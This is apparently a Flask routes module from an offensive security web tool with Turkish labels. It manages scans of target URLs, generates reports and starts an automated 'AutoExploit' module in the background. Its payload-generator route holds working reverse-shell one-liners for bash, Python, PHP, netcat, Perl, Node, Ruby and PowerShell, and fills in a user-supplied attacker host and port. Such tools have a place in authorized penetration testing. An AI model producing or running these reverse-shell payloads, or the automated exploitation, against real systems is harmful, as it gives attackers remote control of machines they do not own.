import datetime
import io
import csv
import threading

from flask import Blueprint, jsonify, make_response, redirect, render_template, request, session

from cyberapp.models.db import db_conn
from cybermodules.helpers import PDFReport
from cybermodules.autoexploit import AutoExploit
from cyberapp.services.worker import run_worker
from cyberapp.services.audit import log_audit as audit_log
from cyberapp.services.queue import enqueue_job

scans_bp = Blueprint("scans", __name__)


@scans_bp.route("/scans")
def scans_list():
    """Tüm taramaları listele"""
    if not session.get("logged_in"):
        return redirect("/login")
    
    try:
        with db_conn() as conn:
            scans = conn.execute(
                "SELECT id, target, date, status, user_id FROM scans ORDER BY id DESC LIMIT 50"
            ).fetchall()
            print(f"DEBUG: Found {len(scans)} scans")
            
            # Calculate statistics
            completed_count = sum(1 for s in scans if 'COMPLETED' in s[3] or 'TAMAMLANDI' in s[3])
            running_count = sum(1 for s in scans if 'RUNNING' in s[3] or 'DEVAM' in s[3])
            failed_count = sum(1 for s in scans if 'FAILED' in s[3] or 'HATA' in s[3])
            
            print(f"DEBUG: completed={completed_count}, running={running_count}, failed={failed_count}")
        
        return render_template("scans.html", scans=scans, completed_count=completed_count, running_count=running_count, failed_count=failed_count)
    except Exception as e:
        import traceback
        traceback.print_exc()
        return f"Error: {str(e)}", 500


@scans_bp.route("/scan", methods=["POST"])
def scan():
    if not session.get("logged_in"):
        return redirect("/login")

    target = request.form.get("target", "").strip()
    run_python = request.form.get("python_scan") == "on"
    tools = request.form.getlist("tools")
    user_id = session.get("user", "anonymous")

    if not target:
        return redirect("/")

    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    with db_conn() as conn:
        cursor = conn.cursor()
        cursor.execute(
            """
            INSERT INTO scans (target, date, status, user_id)
            VALUES (?, ?, ?, ?)
            """,
            (target, datetime.datetime.now().isoformat(), "HAZIRLANIYOR...", user_id),
        )
        scan_id = cursor.lastrowid
        conn.execute(
            "INSERT INTO scan_progress (scan_id, progress, eta_seconds) VALUES (?, ?, ?)",
            (scan_id, 0, None),
        )
        conn.commit()

    audit_log(user_id, session.get("role"), "scan_started", f"scan_id={scan_id} target={target}", request.remote_addr)

    enqueue_job(run_worker, target, scan_id, run_python, tools, user_id)

    return redirect("/")


@scans_bp.route("/delete/<int:scan_id>")
def delete_scan(scan_id):
    if not session.get("logged_in"):
        return redirect("/login")
    if session.get("role") != "admin":
        return "Forbidden", 403

    with db_conn() as conn:
        conn.execute("DELETE FROM scans WHERE id = ?", (scan_id,))

    audit_log(session.get("user"), session.get("role"), "scan_deleted", f"scan_id={scan_id}", request.remote_addr)
    return redirect("/")


@scans_bp.route("/details/<int:scan_id>")
def details(scan_id):
    if not session.get("logged_in"):
        return redirect("/login")

    try:
        with db_conn() as conn:
            scan = conn.execute("SELECT * FROM scans WHERE id=?", (scan_id,)).fetchone()
            if not scan:
                return "Scan not found", 404

            vulns = conn.execute("SELECT * FROM vulns WHERE scan_id=?", (scan_id,)).fetchall()
            techs = conn.execute("SELECT * FROM techno WHERE scan_id=?", (scan_id,)).fetchall()
            intel = conn.execute("SELECT * FROM intel WHERE scan_id=?", (scan_id,)).fetchall()

        try:
            pdf = PDFReport()
            pdf.add_page()

            pdf.chapter_title(f"Scan Report: {scan[1]}", (0, 100, 0))
            pdf.set_font("Arial", "", 10)
            pdf.cell(0, 10, f"Date: {scan[2]}", ln=True)
            pdf.cell(0, 10, f"Status: {scan[3]}", ln=True)
            pdf.ln(5)

            if vulns:
                pdf.chapter_title("Vulnerabilities", (255, 0, 0))
                for v in vulns:
                    try:
                        pdf.cell(0, 10, f"- {v[2]}: {str(v[3])[:50]}...", ln=True)
                    except Exception:
                        pass

            if techs:
                pdf.chapter_title("Detected Technologies", (0, 0, 255))
                for t in techs:
                    try:
                        pdf.cell(0, 10, f"- {t[2]}: {str(t[3])}", ln=True)
                    except Exception:
                        pass

            pdf_path = f"/tmp/report_{scan_id}.pdf"
            try:
                pdf.output(pdf_path)
                with open(pdf_path, "rb") as f:
                    response = make_response(f.read())
                response.headers["Content-Type"] = "application/pdf"
                response.headers["Content-Disposition"] = f"attachment; filename=report_{scan_id}.pdf"
                return response
            except Exception:
                pass
        except Exception:
            pass

        vuln_html = ""
        for v in vulns:
            vuln_type = v[2] if len(v) > 2 else "Unknown"
            vuln_url = v[3] if len(v) > 3 else "N/A"
            vuln_fix = v[4] if len(v) > 4 else "Önerilecek önlem aranıyor..."
            vuln_html += f"""
            <div style="background: #1a1a2e; padding: 15px; margin: 10px 0; border-left: 4px solid #ff4444;">
                <h3 style="color: #ff4444; margin-top: 0;">⚠️ {vuln_type}</h3>
                <p><strong>URL:</strong> <code>{vuln_url}</code></p>
                <p><strong>Düzeltme:</strong> {vuln_fix}</p>
            </div>
            """

        tech_html = ""
        for t in techs:
            tech_name = t[2] if len(t) > 2 else "Unknown"
            tech_via = t[3] if len(t) > 3 else "Detection method"
            tech_html += f"""
            <div style="background: #1a1a2e; padding: 10px; margin: 5px 0; border-left: 4px solid #4444ff;">
                <strong>{tech_name}</strong><br/>
                <small>Tespit Yöntemi: {tech_via}</small>
            </div>
            """

        intel_html = ""
        if intel:
            intel_html = "<div style=\"background: #1a1a2e; padding: 15px; border-left: 4px solid #888;\">"
            intel_html += "".join(
                [f"<p><strong>[{i[2]}]</strong> {i[3][:150]}</p>" for i in intel if i]
            )
            intel_html += "</div>"

        return render_template(
            "details.html",
            scan=scan,
            vulns=vulns,
            techs=techs,
            vuln_html=vuln_html,
            tech_html=tech_html,
            intel_html=intel_html,
        )
    except Exception as e:
        return f"<html><body>Error: {str(e)}</body></html>", 500


@scans_bp.route("/payloads", methods=["GET", "POST"])
def payloads_generator():
    if not session.get("logged_in"):
        return redirect("/login")

    payloads_dict = {
        "bash": "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
        "python": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' """,
        "php": """php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");' """,
        "nc": "nc -e /bin/sh LHOST LPORT",
        "perl": """perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' """,
        "node": """node -e 'require("child_process").exec("bash -i >& /dev/tcp/LHOST/LPORT 0>&1")' """,
        "ruby": """ruby -rsocket -e 'c=TCPSocket.new("LHOST",LPORT);while true;cmd=c.gets;system(cmd);c.puts `#{cmd}`;end' """,
        "powershell": """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);""",
    }

    if request.method == "POST":
        lhost = request.form.get("lhost", "127.0.0.1")
        lport = request.form.get("lport", "4444")
        payload_type = request.form.get("payload_type", "bash")

        payload = payloads_dict.get(payload_type, payloads_dict["bash"])
        payload = payload.replace("LHOST", lhost).replace("LPORT", lport)

        with db_conn() as conn:
            conn.execute(
                "INSERT INTO tool_logs (scan_id, tool_name, output) VALUES (?, ?, ?)",
                (0, "PAYLOAD_GENERATOR", f"[{payload_type}] {lhost}:{lport}"),
            )
            conn.commit()

        payload_html = (
            "<code style='background: #1a1a2e; padding: 10px; display: block; word-wrap: break-word;'>"
            f"{payload}</code>"
        )
    else:
        payload_html = ""

    return render_template("payloads.html", payload_html=payload_html)


@scans_bp.route("/autoexploit")
def autoexploit_panel():
    if not session.get("logged_in"):
        return redirect("/login")

    with db_conn() as conn:
        scans = conn.execute(
            """
            SELECT id, target, status FROM scans
            WHERE status LIKE '%COMPLETED%' OR status LIKE '%TAMAMLANDI%'
            ORDER BY id DESC
            LIMIT 10
            """
        ).fetchall()

    return render_template("autoexploit.html", scans=scans)


@scans_bp.route("/autoexploit/<int:scan_id>")
def start_autoexploit(scan_id):
    if not session.get("logged_in"):
        return redirect("/login")

    with db_conn() as conn:
        target = conn.execute("SELECT target FROM scans WHERE id = ?", (scan_id,)).fetchone()

    if target:
        autoexploit = AutoExploit(scan_id, target[0])
        threading.Thread(target=autoexploit.start, daemon=True).start()
        return jsonify(
            {
                "status": "started",
                "scan_id": scan_id,
                "message": "AutoExploit started in background",
            }
        )

    return jsonify({"error": "Scan not found"})


@scans_bp.route("/report/<int:scan_id>")
def generate_report(scan_id):
    """Generate comprehensive security report"""
    if not session.get("logged_in"):
        return redirect("/login")
    
    try:
        from cybermodules.report_generator import generate_scan_report
        
        result = generate_scan_report(scan_id)
        
        # Log the report generation
        try:
            with db_conn() as conn:
                conn.execute(
                    "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
                    (scan_id, "REPORT_GENERATED", f"HTML: {result['html_path']}, Risk: {result['risk_score']}")
                )
                conn.commit()
        except Exception:
            pass
        
        # Return download links
        return render_template(
            "report_template.html",
            scan_id=scan_id,
            report=result,
            target=result.get('target', 'Unknown')
        )
        
    except Exception as e:
        import traceback
        traceback.print_exc()
        return f"Report generation error: {str(e)}", 500


@scans_bp.route("/api/report/<int:scan_id>")
def api_generate_report(scan_id):
    """API endpoint for report generation"""
    if not session.get("logged_in"):
        return jsonify({"success": False, "error": "Unauthorized"}), 401
    
    try:
        from cybermodules.report_generator import generate_scan_report
        result = generate_scan_report(scan_id)
        
        return jsonify({
            "success": True,
            "report": result
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@scans_bp.route("/download/report/<int:scan_id>")
def download_report(scan_id):
    """Download report file"""
    if not session.get("logged_in"):
        return redirect("/login")
    
    import os
    from flask import send_file
    
    format_type = request.args.get("format", "html")
    
    try:
        with db_conn() as conn:
            scan = conn.execute("SELECT target FROM scans WHERE id = ?", (scan_id,)).fetchone()
            target = scan[0] if scan else "Unknown"
    
        target_clean = target.replace('.', '_').replace(':', '_').replace('/', '_')
        
        if format_type == "pdf":
            filename = f"/tmp/report_{scan_id}.pdf"
            if os.path.exists(filename):
                return send_file(
                    filename,
                    as_attachment=True,
                    download_name=f"security_report_{target_clean}_{scan_id}.pdf"
                )
        elif format_type == "json":
            filename = f"/tmp/report_{scan_id}_summary.json"
            if os.path.exists(filename):
                return send_file(
                    filename,
                    as_attachment=True,
                    download_name=f"security_report_{target_clean}_{scan_id}.json"
                )
        else:
            filename = f"/tmp/report_{scan_id}_{target_clean}.html"
            if os.path.exists(filename):
                return send_file(
                    filename,
                    as_attachment=True,
                    download_name=f"security_report_{target_clean}_{scan_id}.html",
                    mimetype='text/html'
                )
                
        return "Report file not found", 404
        
    except Exception as e:
        return f"Download error: {str(e)}", 500